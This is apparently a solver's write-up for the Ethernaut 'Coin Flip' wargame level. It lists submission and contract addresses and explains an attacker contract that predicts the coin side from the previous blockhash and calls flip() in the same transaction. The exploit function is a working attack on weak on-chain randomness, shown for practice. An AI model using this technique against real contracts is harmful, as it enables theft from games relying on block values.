Submit level txnHash: 0x78b830ee75881549dc83c91f5a643d3ed1533ef2e83e51d460f667eaa091e2cc
Instance address: 0x1dba3eDAcc5775BF5a0b13B9aC23c6f72431E8BA
Level address: 0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f


to get 10 wins in a row
dont use block.number for randomness
i create smart contract named `Attack` to and I put this function in it:
```javascript
function guessFlip() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;        
        target.flip(side);
    }
```
this function calculate `blockValue` and then `side` is calculated. because the `flip()` function is called inside the `guessFlip()` function , it will be one transaction and block number is the same.
